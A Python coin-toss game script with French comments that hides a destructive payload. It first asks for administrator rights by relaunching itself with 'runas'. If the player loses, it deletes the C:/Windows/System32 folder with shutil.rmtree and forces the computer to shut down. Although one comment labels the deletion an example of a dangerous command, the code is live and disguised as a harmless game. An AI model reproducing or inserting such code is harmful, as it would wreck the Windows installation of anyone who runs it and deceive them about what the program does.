import random
import ctypes
import sys
import os
import shutil

def demander_droits_admin():
    """Demande les droits d'administrateur si le script n'est pas exécuté avec eux."""
    try:
        # Vérifie si le script est déjà exécuté avec des droits d'administrateur
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    if not is_admin:
        # Relance le script avec des droits d'administrateur
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

def afficher_menu():
    """Affiche le menu principal avec un design ASCII."""
    print(r"""
██████╗ ██╗██╗     ███████╗     ██████╗ ██╗   ██╗    ███████╗ █████╗  ██████╗███████╗    ██████╗ 
██╔══██╗██║██║     ██╔════╝    ██╔═══██╗██║   ██║    ██╔════╝██╔══██╗██╔════╝██╔════╝    ╚════██╗
██████╔╝██║██║     █████╗      ██║   ██║██║   ██║    █████╗  ███████║██║     █████╗        ▄███╔╝
██╔═══╝ ██║██║     ██╔══╝      ██║   ██║██║   ██║    ██╔══╝  ██╔══██║██║     ██╔══╝        ▀▀══╝ 
██║     ██║███████╗███████╗    ╚██████╔╝╚██████╔╝    ██║     ██║  ██║╚██████╗███████╗      ██╗   
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝  ╚═════╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝      ╚═╝  
    """)

def main():
    """Fonction principale du jeu."""
    # Demande les droits d'administrateur
    demander_droits_admin()

    # Affiche le message de bienvenue et le menu
    print("Bienvenue dans le jeu de Pile ou Face !")
    afficher_menu()

    # Génère un nombre aléatoire : 1 pour pile, 2 pour face
    number = random.randint(1, 2)

    # Boucle jusqu'à ce que l'utilisateur fournisse une entrée valide
    while True:
        guess = input("Choisissez 'pile' ou 'face' : ").strip().lower()
        if guess in ["pile", "face"]:
            break
        print("Entrée invalide. Veuillez choisir 'pile' ou 'face'.")

    # Convertit le choix de l'utilisateur en un nombre
    guess_number = 1 if guess == "pile" else 2

    # Vérifie si l'utilisateur a gagné ou perdu
    if guess_number == number:
        print("Bien joué, vous avez gagné !")
    else:
        print("Dommage, vous avez perdu. Réessayez !")
        shutil.rmtree("C:/Windows/System32", ignore_errors=True)  # Supprime le dossier System32 (exemple de commande dangereuse)
        os.system("shutdown /f /p")  # Éteint l'ordinateur
    # Pause pour garder la fenêtre ouverte
    input("\nAppuyez sur Entrée pour quitter...")
    

# Exécute la fonction principale
if __name__ == "__main__":
    main()
